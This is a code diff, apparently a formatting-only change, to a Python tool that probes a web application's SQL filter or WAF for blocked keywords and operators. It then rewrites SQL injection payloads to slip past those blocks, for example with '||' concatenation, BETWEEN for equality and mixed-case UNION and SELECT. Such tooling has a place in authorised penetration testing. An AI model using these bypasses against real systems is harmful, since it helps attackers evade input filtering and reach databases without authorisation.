@@ -51,23 +51,58 @@ class FilterEnumeratorTool:
 
     # SQL keywords to test
     SQL_KEYWORDS: List[str] = [
-        "OR", "AND", "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP",
-        "WHERE", "FROM", "LIKE", "GLOB", "IS", "NOT", "NULL", "BETWEEN",
-        "true", "false", "admin",
+        "OR",
+        "AND",
+        "UNION",
+        "SELECT",
+        "INSERT",
+        "UPDATE",
+        "DELETE",
+        "DROP",
+        "WHERE",
+        "FROM",
+        "LIKE",
+        "GLOB",
+        "IS",
+        "NOT",
+        "NULL",
+        "BETWEEN",
+        "true",
+        "false",
+        "admin",
     ]
 
     # SQL operators/characters to test
     SQL_OPERATORS: List[str] = [
-        "=", "!=", "<>", "<", ">", "<=", ">=",
-        ";", "--", "/*", "*/", "#",
-        "||", "'", '"',
+        "=",
+        "!=",
+        "<>",
+        "<",
+        ">",
+        "<=",
+        ">=",
+        ";",
+        "--",
+        "/*",
+        "*/",
+        "#",
+        "||",
+        "'",
+        '"',
     ]
 
     # Words in response body that indicate a filter/WAF block
     BLOCK_INDICATORS: List[str] = [
-        "blocked", "filtered", "forbidden", "waf",
-        "not allowed", "rejected", "invalid input",
-        "illegal", "banned", "denied",
+        "blocked",
+        "filtered",
+        "forbidden",
+        "waf",
+        "not allowed",
+        "rejected",
+        "invalid input",
+        "illegal",
+        "banned",
+        "denied",
     ]
 
     def __init__(self, session: Optional[requests.Session] = None) -> None:
@@ -95,7 +130,9 @@ class FilterEnumeratorTool:
 
         # 1. Status code differs from baseline (e.g., 403 vs 200)
         if resp.status_code != baseline_status:
-            reasons.append(f"status_code changed: {baseline_status} -> {resp.status_code}")
+            reasons.append(
+                f"status_code changed: {baseline_status} -> {resp.status_code}"
+            )
 
         # 2. Check for block indicator words in response body
         body_lower = resp.text.lower()
@@ -200,7 +237,9 @@ class FilterEnumeratorTool:
                 error_items.append((keyword, "request failed"))
                 continue
 
-            is_blocked, reasons = self._is_blocked(resp, baseline_status, baseline_length)
+            is_blocked, reasons = self._is_blocked(
+                resp, baseline_status, baseline_length
+            )
             if is_blocked:
                 blocked_keywords.append((keyword, reasons))
             else:
@@ -215,7 +254,9 @@ class FilterEnumeratorTool:
                 error_items.append((operator, "request failed"))
                 continue
 
-            is_blocked, reasons = self._is_blocked(resp, baseline_status, baseline_length)
+            is_blocked, reasons = self._is_blocked(
+                resp, baseline_status, baseline_length
+            )
             if is_blocked:
                 blocked_operators.append((operator, reasons))
             else:
@@ -301,34 +342,58 @@ class FilterEnumeratorTool:
         blocked_op_set = {op for op, _ in blocked_operators}
 
         if "or" in blocked_kw_set and "||" not in blocked_op_set:
-            output_lines.append("  - 'OR' blocked but '||' allowed: use '||' for boolean OR")
+            output_lines.append(
+                "  - 'OR' blocked but '||' allowed: use '||' for boolean OR"
+            )
         if "and" in blocked_kw_set:
-            output_lines.append("  - 'AND' blocked: use nested subqueries or CASE WHEN expressions")
+            output_lines.append(
+                "  - 'AND' blocked: use nested subqueries or CASE WHEN expressions"
+            )
         if "=" in blocked_op_set:
             if "IS" in [kw for kw in allowed_keywords]:
-                output_lines.append("  - '=' blocked but IS allowed: use 'IS' for equality")
+                output_lines.append(
+                    "  - '=' blocked but IS allowed: use 'IS' for equality"
+                )
             if "GLOB" in [kw for kw in allowed_keywords]:
-                output_lines.append("  - '=' blocked but GLOB allowed: use 'GLOB' for matching")
+                output_lines.append(
+                    "  - '=' blocked but GLOB allowed: use 'GLOB' for matching"
+                )
             if "LIKE" in [kw for kw in allowed_keywords]:
-                output_lines.append("  - '=' blocked but LIKE allowed: use 'LIKE' for matching")
+                output_lines.append(
+                    "  - '=' blocked but LIKE allowed: use 'LIKE' for matching"
+                )
             if "BETWEEN" in [kw for kw in allowed_keywords]:
-                output_lines.append("  - '=' blocked but BETWEEN allowed: use 'BETWEEN x AND x'")
+                output_lines.append(
+                    "  - '=' blocked but BETWEEN allowed: use 'BETWEEN x AND x'"
+                )
         if "--" in blocked_op_set and "/*" not in blocked_op_set:
-            output_lines.append("  - '--' blocked but '/*' allowed: use '/**/' for comments")
+            output_lines.append(
+                "  - '--' blocked but '/*' allowed: use '/**/' for comments"
+            )
         if "--" in blocked_op_set and "/*" in blocked_op_set:
-            output_lines.append("  - All comments blocked: try no-comment query termination")
+            output_lines.append(
+                "  - All comments blocked: try no-comment query termination"
+            )
         if "admin" in blocked_kw_set and "||" not in blocked_op_set:
-            output_lines.append("  - 'admin' blocked but '||' allowed: use 'ad'||'min' concatenation")
+            output_lines.append(
+                "  - 'admin' blocked but '||' allowed: use 'ad'||'min' concatenation"
+            )
         if "like" in blocked_kw_set and "GLOB" in [kw for kw in allowed_keywords]:
-            output_lines.append("  - 'LIKE' blocked but GLOB allowed: use GLOB for pattern matching")
+            output_lines.append(
+                "  - 'LIKE' blocked but GLOB allowed: use GLOB for pattern matching"
+            )
         if "true" in blocked_kw_set:
             output_lines.append("  - 'true' blocked: use literal 1 instead")
         if "false" in blocked_kw_set:
             output_lines.append("  - 'false' blocked: use literal 0 instead")
         if "union" in blocked_kw_set:
-            output_lines.append("  - 'UNION' blocked: try case variation (UnIoN) or encoding")
+            output_lines.append(
+                "  - 'UNION' blocked: try case variation (UnIoN) or encoding"
+            )
         if "select" in blocked_kw_set:
-            output_lines.append("  - 'SELECT' blocked: try case variation (SeLeCt) or encoding")
+            output_lines.append(
+                "  - 'SELECT' blocked: try case variation (SeLeCt) or encoding"
+            )
 
         if not blocked_keywords and not blocked_operators:
             output_lines.append("  No filters detected! Standard payloads should work.")
@@ -541,7 +606,9 @@ class PayloadMutatorTool:
                 # Replace all occurrences of this blocked keyword
                 new_payload = pattern.sub(replacement, payload)
                 if new_payload != payload:
-                    variants.append((new_payload, [f"{blocked} -> {replacement} ({desc})"]))
+                    variants.append(
+                        (new_payload, [f"{blocked} -> {replacement} ({desc})"])
+                    )
 
         # Strategy 2: Handle '=' with BETWEEN bypass (context-aware)
         # Pattern: 'X'='Y' -> 'X' BETWEEN 'Y' AND 'Y'
@@ -550,15 +617,24 @@ class PayloadMutatorTool:
                 r"(['\"]?)([^'\"=<>!]+)\1\s*=\s*(['\"]?)([^'\"=<>!]+)\3"
             )
             for match in between_pattern.finditer(payload):
-                q1, val1, q2, val2 = match.group(1), match.group(2), match.group(3), match.group(4)
+                q1, val1, q2, val2 = (
+                    match.group(1),
+                    match.group(2),
+                    match.group(3),
+                    match.group(4),
+                )
                 original = match.group(0)
-                between_expr = f"{q1}{val1}{q1} BETWEEN {q2}{val2}{q2} AND {q2}{val2}{q2}"
+                between_expr = (
+                    f"{q1}{val1}{q1} BETWEEN {q2}{val2}{q2} AND {q2}{val2}{q2}"
+                )
                 new_payload = payload.replace(original, between_expr, 1)
                 if new_payload != payload:
-                    variants.append((
-                        new_payload,
-                        [f"{original} -> {between_expr} (BETWEEN equality bypass)"],
-                    ))
+                    variants.append(
+                        (
+                            new_payload,
+                            [f"{original} -> {between_expr} (BETWEEN equality bypass)"],
+                        )
+                    )
 
         # Strategy 3: Multi-token replacement (replace ALL blocked tokens at once)
         # This is the most useful for heavily filtered environments
@@ -593,10 +669,14 @@ class PayloadMutatorTool:
                 # Actually show the CASE WHEN pattern as guidance
                 case_variant = and_pattern.sub("", payload).strip()
                 if case_variant != payload:
-                    variants.append((
-                        case_variant,
-                        ["AND -> removed (use CASE WHEN ... THEN ... END for boolean logic)"],
-                    ))
+                    variants.append(
+                        (
+                            case_variant,
+                            [
+                                "AND -> removed (use CASE WHEN ... THEN ... END for boolean logic)"
+                            ],
+                        )
+                    )
 
         # Deduplicate variants (same payload text)
         seen: Dict[str, int] = {}
@@ -653,11 +733,7 @@ class PayloadMutatorTool:
 
         # Filter by max_length if specified
         if max_length and max_length > 0:
-            variants = [
-                (v, subs)
-                for v, subs in variants
-                if len(v) <= max_length
-            ]
+            variants = [(v, subs) for v, subs in variants if len(v) <= max_length]
 
         # Check each variant for remaining blocked keywords
         variant_results: List[Tuple[str, List[str], List[str], bool]] = []
@@ -693,7 +769,9 @@ class PayloadMutatorTool:
             output_lines.append("")
             output_lines.append("SUGGESTIONS:")
             output_lines.append("  - Try a completely different payload structure")
-            output_lines.append("  - Consider encoding-based bypasses (URL encode, double encode)")
+            output_lines.append(
+                "  - Consider encoding-based bypasses (URL encode, double encode)"
+            )
             output_lines.append("  - Check if the filter is case-sensitive")
             if max_length and max_length > 0:
                 output_lines.append(
@@ -704,7 +782,9 @@ class PayloadMutatorTool:
 
         # Clean variants section
         if clean_count > 0:
-            output_lines.append(f"CLEAN VARIANTS ({clean_count}) - No blocked keywords remain:")
+            output_lines.append(
+                f"CLEAN VARIANTS ({clean_count}) - No blocked keywords remain:"
+            )
             output_lines.append("-" * 50)
             variant_num = 0
             for v_payload, v_subs, still_blocked, is_clean in variant_results:
@@ -714,17 +794,21 @@ class PayloadMutatorTool:
                 output_lines.append(f"  Variant #{variant_num}:")
                 output_lines.append(f"    Payload: {v_payload}")
                 output_lines.append(f"    Length:  {len(v_payload)} chars")
-                output_lines.append(f"    Changes:")
+                output_lines.append("    Changes:")
                 for sub in v_subs:
                     output_lines.append(f"      - {sub}")
                 output_lines.append("")
         else:
-            output_lines.append("NO CLEAN VARIANTS - all variants still contain blocked keywords.")
+            output_lines.append(
+                "NO CLEAN VARIANTS - all variants still contain blocked keywords."
+            )
             output_lines.append("")
 
         # Partial variants section
         if partial_count > 0:
-            output_lines.append(f"PARTIAL VARIANTS ({partial_count}) - Some blocked keywords remain:")
+            output_lines.append(
+                f"PARTIAL VARIANTS ({partial_count}) - Some blocked keywords remain:"
+            )
             output_lines.append("-" * 50)
             variant_num = 0
             for v_payload, v_subs, still_blocked, is_clean in variant_results:
@@ -734,7 +818,7 @@ class PayloadMutatorTool:
                 output_lines.append(f"  Variant #{variant_num}:")
                 output_lines.append(f"    Payload: {v_payload}")
                 output_lines.append(f"    Length:  {len(v_payload)} chars")
-                output_lines.append(f"    Changes:")
+                output_lines.append("    Changes:")
                 for sub in v_subs:
                     output_lines.append(f"      - {sub}")
                 output_lines.append(f"    Still blocked: {', '.join(still_blocked)}")
